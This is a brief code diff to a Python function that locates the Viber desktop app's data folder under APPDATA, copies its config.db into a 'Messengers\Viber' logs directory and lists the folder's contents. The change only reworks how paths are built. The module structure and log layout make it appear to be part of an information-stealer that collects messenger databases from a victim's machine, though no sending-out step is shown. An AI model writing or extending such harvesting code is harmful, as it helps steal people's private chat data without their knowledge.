@@ -1,4 +1,4 @@
-from os import sep,listdir,makedirs,getenv,environ
+from os import sep,listdir,makedirs,environ
 from shutil import copy2
 from manager.logger import Log
 from preferences.config import config
@@ -8,9 +8,8 @@ def Viber():
         msgInfo = ""
         try:
             path = 'ViberPC'   
-            roaming = getenv('APPDATA')
-            user = environ['USERPROFILE']
-            pathtofile = f'{user}\\{config.pathToLogs}\\Messengers\\Viber'
+            roaming = environ["APPDATA"]
+            pathtofile = f'{config.pathToLogs}\\Messengers\\Viber'
             makedirs(pathtofile, exist_ok=True)
             copy2(roaming+ sep + path+"/config.db",pathtofile)
             dirs = listdir(f"{roaming+sep+path}")
